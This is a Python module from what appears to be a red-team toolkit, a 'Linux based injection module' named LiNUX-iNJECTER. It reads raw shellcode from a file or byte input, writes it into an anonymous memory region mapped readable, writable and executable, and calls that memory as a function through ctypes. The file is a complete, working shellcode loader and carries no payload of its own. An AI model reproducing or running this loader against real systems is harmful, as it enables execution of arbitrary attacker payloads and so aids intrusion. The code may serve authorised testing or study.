import ctypes
import mmap

from utils.helper import CheckFile, GetFileInfo
from utils.style import *

CATEGORY    = 'inject'
DESCRIPTION = 'Linux based injection module'

arglist = {
    'input':            { 'value': None, 'desc': 'Input file for injection' }
}

def register_arguments(parser):
    parser.add_argument('-i', '--input', help=arglist['input']['desc'])


class module:
    Author = 'psycore8'
    Version = '0.0.2'
    DisplayName = 'LiNUX-iNJECTER'
    relay_input = False
    shell_path = '::inject::linject'
    data_size = 0
    hash = ''
    shellcode = any


    def msg(self, message_type, MsgVar=None, ErrorExit=False):
        messages = {
            'pre.head'       : f'{FormatModuleHeader(self.DisplayName, self.Version)}\n',
            'post.done'      : f'{s_ok} DONE!',
            'mok'            : f'{s_ok} {MsgVar}',
            'mnote'          : f'{s_note} {MsgVar}',
            'merror'         : f'{s_fail} {MsgVar}'
        }
        print(messages.get(message_type, f'{message_type} - this message type is unknown'))
        if ErrorExit:
            exit()

    def __init__(self, input):
        self.input = input

    def start_injection(self):
        buf = mmap.mmap(-1, len(self.shellcode), prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
        buf.write(self.shellcode)
        ctypes_buffer = ctypes.c_void_p(ctypes.addressof(ctypes.c_char.from_buffer(buf)))
        func_type = ctypes.CFUNCTYPE(None)
        func = func_type(ctypes_buffer.value)
        self.msg('mnote', 'Execute shellcode...')
        func()

    def open_file(self):
        try:
            with open(self.input, 'rb') as file:
                self.shellcode = file.read()
        except FileNotFoundError:
            return False

    def process(self):
        m = self.msg
        m('pre.head')
        if isinstance(self.input, str):
            CheckFile(self.input)
            self.data_size, self.hash = GetFileInfo(self.input)
            m('mok', f'File {self.input} loaded\n{s_ok} Size of shellcode {self.data_size} bytes\n{s_ok} Hash: {self.hash}')
            self.open_file()
            self.start_injection()
        elif isinstance(self.input, bytes):
            self.shellcode = self.input
            self.start_injection()
        m('post.done')